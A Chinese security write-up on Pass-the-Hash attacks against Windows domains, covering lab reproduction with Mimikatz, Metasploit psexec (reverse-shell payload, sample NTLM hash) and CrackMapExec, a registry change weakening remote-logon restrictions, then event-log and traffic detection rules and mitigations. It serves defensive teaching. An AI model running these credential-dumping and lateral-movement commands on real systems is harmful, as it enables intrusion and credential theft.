> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [forum.ezreal.cool](https://forum.ezreal.cool/thread-59-1-1.html) ![](https://forum.ezreal.cool/uc_server/avatar.php?uid=2&size=middle)绿盟科技 

1. 技术介绍
-------

### 1.1 哈希传递攻击（PTH）

上一章节讲解了通过 LAS 进行 Windows 凭据获取的技术，本章将通过介绍哈希传递攻击（ATT&CK - T1550.002 Use Alternate Authentication Material: Pass the Hash），此技术归属于防御规避（ATT&CK - TA0005 Defense Evasion）与横向移动（ATT&CK - TA0008 Lateral Movement）。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641567.png)

Pass the Hash 哈希传递攻击简称 PTH，利用这一方式能够通过获取的与账户相关的密码哈希值（NTLM Hash）来进行攻击。哈希传递本身是一种 Windows 系统的用户身份验证的方法，无需访问用户的明文密码。这种方法能够有效绕过明文密码的标准身份验证步骤，直接进入使用密码哈希值的身份验证步骤。攻击者在未获取到系统的明文密码的情况下，能够利用 LM Hash 和 NTLM Hash 通过哈希传递（PTH）在内网环境中进行横向移动，绕过正常的系统访问控制。

在执行哈希传递攻击之前，需要使用凭据访问技术（Credential Access）获取正在使用的账户的有效密码哈希。将捕获的哈希值利用哈希传递以验证该用户的身份。一旦通过用户身份验证，则可以在本地或远程系统上执行操作。

攻击者还有可能使用获取的密码哈希值进行超 - 哈希传递攻击（Overpass the Hash），与哈希传递攻击类似，这也涉及到用密码哈希值进行身份验证——使用密码哈希值创建有效的 Kerberos 票据，随后可使用此票据进行票据传递攻击（Pass the Ticket）。

我们根据攻防经验对此技术给出 6 个方向的评分：

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641592.png)

### 1.2 适用范围

Windows 系统

### 1.3 限制条件

工作组环境：

•   Windows Vista 之前的系统，可使用本地管理员组内用户的哈希值进行攻击。

•   Windows Vista 之后的系统，只可使用 Administrator 用户的哈希值才能进行攻击，其他用户（包括除 Administrator 外的其他管理员组用户）无法使用哈希传递攻击，

会提示拒绝访问。

域环境：

•   可利用域管理员组内任一用户的哈希值进行哈希传递攻击，攻击成功则可访问域内任意主机。

•   若已安装 KB2871997 补丁，普通域管用户的哈希值无法成功进行哈希传递，但可利用默认的 Administrator(SID 为 500) 账号进行哈希传递攻击。

2. 攻击视角
-------

### 2.1 攻击场景

哈希传递攻击本身是基于 NTLM 认证的一种攻击方式。利用哈希传递攻击的前提是首先要通过凭据访问技术或其他方式获取到某个用户的密码哈希值，且在无法解开明文的情况下可以利用此方法。在内网中，往往有大量主机会使用相同的本地管理员账号和密码。若不同主机的本地管理员账号和密码是相同的，攻击者就能够利用哈希传递攻击进行横向移动。在域环境中，若已取得域管理员组内用户的 NTLM 哈希值，就能够对域内任何一台主机（包括域控）进行哈希传递攻击。

攻击前序：

•   凭据获取

*   Credential Access - T1003.001 OS Credential Dumping: LSASS Memory
*   Credential Access - T1003.002 OS Credential Dumping: Security Account Manager
*   Credential Access - T1003.004 OS Credential Dumping: LSA Secrets
*   Credential Access - T1003.006 OS Credential Dumping: DCSync

•   其他能够获取凭据的方式

攻击后续：

哈希传递攻击成功后，本身相当于已经获取到目标主机的权限，攻击者可通过多种方式进行进一步攻击。包括但是不限于以下几种：经过横向移动后，会通过创建后门账户、自启动、定时任务等持久化手段来延长驻留时间；同时也会在该主机上进行信息收集和获取凭据，以便利用关键信息进行下一步渗透；若发现新的网段或该主机为域内主机，攻击者通常会进一步进行扫描探测。

•   持久化

*   Persistence - T1547 Boot or Logon Autostart Execution
*   Persistence - T1037 Boot or Logon Initialization Scripts
*   Persistence - T1053 Scheduled Task/Job
*   Persistence - T1136 Create Account

•   凭据获取

*   Credential Access - T1003 OS Credential Dumping
*   Credential Access - T1552 Unsecured Credentials

•   信息收集

*   Collection - T1213 Data from Information Repositories
*   Collection - T1005 Data from Local System

•   探测主机

*   Discovery - T1018 Remote System Discovery
*   Discovery - T1482 Domain Trust Discovery

•   其他进一步渗透的手段

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641746.png)

### 2.2 攻击复现

复现环境

若在域环境中，通过凭据获取，我们已经获得了域管理员组内用户的密码哈希值，且目标主机开放 445 端口，我们就可以对域内任意一台主机（包括域控）进行哈希传递攻击。接下来就可以利用工具进行哈希传递攻击的复现。测试环境信息如下：

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641779.png)

### 使用 Mimikatz 进行 PTH

首先介绍如何利用 Mimikatz 进行哈希传递攻击。攻击者通过 Mimikatz 在某台主机上获取到了域管的 NTML Hash，并在域内服务器上利用 Mimikatz 进行哈希传递攻击：

```
# mimikatz
privilege::debug
sekurlsa::logonpasswords
```

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641810.png)

成功获取到域管理员的哈希值后，进一步利用 mimikaztz 将获取的 Administrator 的哈希添加至 lsass 中：

```
# 提权
privilege::debug
# 使用administrator用户的NTLM哈希值进行攻击
sekurlsa::pth /user:[用户名]  /domain:[目标机器IP]  /ntlm:[密码哈希]
```

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641846.png)

执行完命令后则会弹出 CMD 窗口，在该窗口我们可以访问域内任意主机，此处为查看域控 C 盘目录下的文件。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641869.png)

### 使用 MSF 进行 PTH

除了利用已经被攻陷的服务器，攻击者也可在攻击机上利用 MSF 进行哈希传递攻击。利用 MSF 进行攻击常用的有以下三个模块：

```
auxiliary/admin/smb/psexec_command      // 在目标机器上执行系统命令              
exploit/windows/smb/psexec            // 用psexec执行系统命令         
exploit/windows/smb/psexec_psh         // 使用powershell作为payload
```

现在以使用 exploit/windows/smb/psexec 模块进行攻击为例，该模块默认使用且仅能使用 windows/meterpreter/reverse_tcp 作为 payload，可执行以下命令来进行各项设置。

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set rhosts 192.168.152.102 //目标主机的IP地址
set lhost 192.168.152.2 //攻击机的IP地址
set smbuser administrator  //域管理员组内任一用户，此处为administrator用户
set smbpass 00000000000000000000000000000000:47a8195f33a10b8eccb76ee154a8da5c  //完整的administrator用户的Hash
set smbdomain NSFOCUSAD  //域名
run
```

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641955.png)

如下图，若攻击成功则可得到目标主机的 shell。需要注意的是 SMBPass 选项的设置，此处设置可为明文密码，也可为哈希值，但是哈希必须完整。冒号前一部分为 LM Hash 部分，若没有获取到该部分的值可用 0 代替；冒号后一部分为 NTLM Hash 部分。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660641970.png)

### 使用 Crackmapexec 进行 PTH

攻击者还可以利用 Crackmapexec 进行攻击。该工具可利用于对 C 段主机进行批量的哈希传递攻击，可在攻击机上直接使用 apt-get 进行安装：

```
apt-get install crackmapexec
```

利用 Crackmapexec 进行哈希传递攻击的命令如下：

```
crackmapexec smb IP -u user -H hash -d domain -x whoami
IP 可以是单个IP也可以是IP段
-u 指定用户名
-H 指定NTLM Hash
-d 指定域
-x 执行系统命令
```

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642030.png)

2.3 常用工具
--------

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642051.png)

3. 防守视角
-------

### 日志检测

### 原理描述

检测某主机是否遭到哈希传递攻击我们所需要关注的是 ID 为 4624 的事件日志，通常情况下会有某些特征。在前文中我们利用 MSF 进行了哈希传递攻击的复现，现阶段我们将对该攻击产生的 ID 为 4624 的事件日志进行分析。可通过事件查看器 - Windows 日志 - 安全获取，再通过筛选当前日志功能，设置事件 ID 为 4624 查看。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642078.png)

安全 ID 为 NULL SID 可以作为一个特征，大部分工具进行哈希传递时会用到 NULL SID，但并非所有工具都会用到 SID，这可以作为参考的依据之一，不可仅依赖于此。从登录类型上来看，我们可以检测到登录类型为 3。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642094.png)

有些攻击工具会将工作站名随机化，所以工作站名并非一个较好的检测特征。同时我们可以看到登录进程为 NtlmSsp，且身份验证数据包为 NTLM，这两项可以与其他项联合作为检测主机是否受到哈希传递攻击的特征。但是 NtlmSsp 并不一定是哈希传递才有，所以可能会产生一定的误报。同时我们需要关注的是源网络地址，此项内容可用于应急溯源时追踪攻击者是从哪台主机发起哈希传递攻击。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642111.png)

完整日志如下：

```
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider {54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4624</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2021-11-12T09:22:06.074751800Z" /> 
  <EventRecordID>2966</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="500" ThreadID="2704" /> 
  <Channel>Security</Channel> 
  <Computer>IIS-01.nsfocusad.com</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data >S-1-0-0</Data> 
  <Data >-</Data> 
  <Data >-</Data> 
  <Data >0x0</Data> 
  <Data >S-1-5-21-4052953071-2457796405-1862302707-500</Data> 
  <Data >Administrator</Data> 
  <Data >NSFOCUSAD</Data> 
  <Data >0x17bd288b4</Data> 
  <Data >3</Data> 
  <Data >NtLmSsp</Data> 
  <Data >NTLM</Data> 
  <Data >WORKSTATION</Data> 
  <Data >{00000000-0000-0000-0000-000000000000}</Data> 
  <Data >-</Data> 
  <Data >NTLM V2</Data> 
  <Data >128</Data> 
  <Data >0x0</Data> 
  <Data >-</Data> 
  <Data >192.168.152.2</Data> 
  <Data >41669</Data> 
  <Data >%%1833</Data> 
  </EventData>
  </Event>
```

同时，我们还需要检测主机是否正在发起哈希传递攻击。在前文中提到，若攻击者通过 Mimikatz 在某台主机上获取到了域管的 NTML Hash，并在域内服务器上利用 Mimikatz 进行哈希传递攻击，登录成功后会产生 ID 为 4624 且登录类型为 9 的日志。NTLM 协议通常要客户端发送协商消息（Negotiate），服务端返回挑战消息（Challenge）和服务端发送认证消息（Authenticate）的三个阶段。我们可以关注到该日志中的登录进程为 seclogo，登录身份验证数据包为 Negotiate，这可以作为较为准确地检测哈希传递攻击的特征。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642151.png)

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642160.png)

完整日志如下：

```
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider {54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4624</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2021-11-16T18:15:43.558713900Z" /> 
  <EventRecordID>3108</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="500" ThreadID="3584" /> 
  <Channel>Security</Channel> 
  <Computer>IIS-01.nsfocusad.com</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data >S-1-5-21-3298759751-3005943220-1472632767-500</Data> 
  <Data >Administrator</Data> 
  <Data >IIS-01</Data> 
  <Data >0x11a02f</Data> 
  <Data >S-1-5-21-3298759751-3005943220-1472632767-500</Data> 
  <Data >Administrator</Data> 
  <Data >IIS-01</Data> 
  <Data >0x5bb311758</Data> 
  <Data >9</Data> 
  <Data >seclogo</Data> 
  <Data >Negotiate</Data> 
  <Data  /> 
  <Data >{00000000-0000-0000-0000-000000000000}</Data> 
  <Data >-</Data> 
  <Data >-</Data> 
  <Data >0</Data> 
  <Data >0x32c</Data> 
  <Data >C:\Windows\System32\svchost.exe</Data> 
  <Data >::1</Data> 
  <Data >0</Data> 
  <Data >%%1833</Data> 
  </EventData>
  </Event>
```

### 规则参考

针对两个较为常见的 SIEM 平台——Splunk 和 IBM QRadar，我们根据日志特征提供了可供参考的检测规则，在已接入相应安全日志的情况下，可以通过以下规则检测发现攻击行为。

### Splunk

```
#检测该主机是否遭受哈希传递攻击
(EventCode=4624 LogonType=3 LogonProcess)
(EventCode=4624 "登录类型"=3 "登录进程"="NtlmSsp" "身份验证数据包"="NTLM")

#检测该主机是否发起哈希传递攻击
(EventCode=4624 LogonType=9 LogonProcess)
(EventCode=4624 "登录类型"=9 "登录进程"="seclogo" "身份验证数据包"="Negotiate")
```

### IBM Qradar

```
#检测该主机是否遭受哈希传递攻击
and when the event(s) were detected by one or more of Microsoft Windows Security Event Log
and when the event matches EventID is 4624, LogonType is 3, LogonProcessName is NtlmSsp, AuthenticationPackageName is NTLM

#检测该主机是否发起哈希传递攻击
and when the event(s) were detected by one or more of Microsoft Windows Security Event Log
and when the event matches EventID is 4624, LogonType is 9, LogonProcessName is seclogo, AuthenticationPackageName is Negotiate
```

流量检测
----

### 原理描述

首先我们可以从工作组和域环境中的 NTLM 认证过程入手考虑这个问题。

使用 NTLM 协议针对用户进行身份验证时，可能存在有工作组和域环境两种情况：

*   使用服务器的本地帐户的凭据，服务器在其本地数据库中存储了用户的密码，将能够对用户进行身份验证。
*   在域环境中，在身份验证期间需要使用域管理员账户，服务器必须请求域控验证用户提供的信息。

在工作组环境中的认证过程如下：

1.  客户端发送协商消息，包含服务器用户名和其他一些协商信息，告诉服务器它想要进行身份验证。
2.  服务端发送挑战消息，包含 Challenge 挑战码，随每个身份验证请求变化。
3.  客户端发送验证消息，包含用服务器用户名的 NTLM-Hash 对 Challenge 加密得到的 Net NTLM-Hash，同时包含其用户名返回给服务器。
4.  服务器根据自身密码的 NTLM-Hash 对 Challenge 加密，并与收到的做对比进行验证。

在域环境中的 NTLM 认证过程如下：

1.  客户端发送协商消息，包含域名或其他一些协商信息，告诉服务器它想要进行身份验证。
2.  服务端发送挑战消息，包含 Challenge 挑战码，随每个身份验证请求变化。
3.  客户端用 NTLM-Hash 对 Challenge 加密，得到的 Net NTLM-Hash，发送给服务器。
4.  服务端向 DC 发送验证消息，包含用户名和域名，原始的 Challenge 和 Net NTLM-Hash。
5.  DC 查此用户的 NTLM，然后对 Challenge 加密，得到 Net NTLM-Hash，再与收到的 Net NTLM-Hash 做对比，进行验证，结果发送给服务器。
6.  服务器根据 DC 返回的结果，对客户端进行回复。

我们可以看到 NTLM 认证采用的是挑战 / 响应（Challenge/Response）的消息交换模式，在以上流程中，登录用户的密码 Hash 即为 NTLM Hash，响应中包含 Net NTLM-Hash。经过对比我们可以发现，工作组和域环境认证方式本质上都是相同的，有所差别的地方就在于 4 和 5 两个步骤。

接下来我们对攻击流量进行分析，该实验环境为域环境。

•   Negotiate 协商消息

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642412.png)

从此请求包中我们可以观察到，客户端向服务器发送了协商消息，其中包含了明文的域名和其他相关信息。

•   Challenge 挑战消息

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642433.png)

从此响应包中我们可以观察到，服务端向客户端发送了挑战消息，其中包含挑战码和其他相关信息。通过这些我们可以得知攻击者可能是试图利用域管理员的身份连接到计算机 IIS-01.nsfocusad.com。

•   Authenticate 认证消息

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642454.png)

从此请求包中我们可以观察到，客户端利用 NTLM-Hash 对 Challenge 加密得到了 Net NTLM-Hash，并发送给服务器。同时该请求包中还包含域名和用户名等相关信息。经过以上 “协商 - 挑战 - 认证” 三个步骤后，服务端就会对身份进行验证，从 NTLM 的认证流程中我们可以得知，在该认证过程中并未使用到密码的明文，而仅使用了密码的 Hash 值，所以攻击者就能够利用该认证方式的缺陷进行哈希传递攻击。因此，从流量侧对哈希传递攻击检测较为困难，其攻击流量与正常流量的差异并不显著，故若从流量侧进行检测会产生误报。

规则参考
----

从流量侧对哈希传递攻击进行精准检测较为困难，提供以下思路进行参考。在实际攻防场景中，攻击者通常会通过 NTLM 协议针对 administrator 用户进行哈希传递攻击，则可使用以下规则筛选出可疑攻击，通常情况下，经过筛选后还需要进行人工判断：

```
(ntlmssp)&&(smb2.acct == [管理员组用户])
```

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642490.png)

若在域环境中，则可根据域控的 IP 进行更精准地匹配：

```
(ntlmssp)&&(smb2.acct == [域管理员组用户])&&(smb2.domain==[域名])
```

缓解处置
----

通常在进行哈希传递攻击前，攻击者会通过凭据访问技术获取管理员组用户的 NTLM Hash，可参考本系列中《利用 LSASS 凭据获取域用户凭据》、《利用 SAM 获取域用户凭据》和《利用 LSA 获取域用户凭据》中的缓解处置方式，阻止攻击者获取凭据以进行哈希传递攻击。

防范措施也可考虑安装官方补丁。微软在 2014 年 5 月发布了 KB2871997 补丁，该补丁通过限制本地管理员组账户的默认访问权限，禁止通过本地管理员权限与远程计算机进行连接，导致无法通过本地管理员权限对远程计算机使用 PsExec、WMI、smbexec、schtasks、sc 等，也无法访问远程主机的文件共享。但实际上但是该方法也具有一定的局限性，安装 KB2871997 补丁后，常规的哈希传递已经无法成功，但默认的 Administrator(SID 为 500) 账号例外，利用这个账号仍可以进行哈希传递。在 Windows Vista 时代时，微软就通过将 LocalAccountTokenFilterPolicy 的值默认设置为 0 来阻止非 administrator 账号的远程连接，包括阻止哈希传递。在这点上，与安装 KB2871997 补丁的主机是相同的，但是只要将 LocalAccountTokenFilterPolicy 设置为 1，依旧能够使用普通管理员账号进行哈希传递。

修改 LocalAccountTokenFilterPolicy 为 1

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

恢复 LocalAccountTokenFilterPolicy 为 0 (删除后需要重启 explorer.exe 才能使修改生效)

```
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /f
```

同时，参考 ATT&CK 的企业缓解措施，一定程度上可阻止哈希传递攻击的执行。

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642563.png)

![](https://forum.ezreal.cool/data/attachment/forum/202208/16/1660642570.png)

4. 参考文献
-------

*   [https://attack.mitre.org/techniques/T1550/002/](https://attack.mitre.org/techniques/T1550/002/)
*   [https://www.sans.org/white-papers/33283/](https://www.sans.org/white-papers/33283/)
*   [https://d3fend.mitre.org/](https://d3fend.mitre.org/)
*   [https://www.freebuf.com/column/220740.html](https://www.freebuf.com/column/220740.html)
*   [https://www.freebuf.com/articles/network/245872.html](https://www.freebuf.com/articles/network/245872.html)
*   [https://blog.csdn.net/qq_36119192/article/details/103941590](https://blog.csdn.net/qq_36119192/article/details/103941590)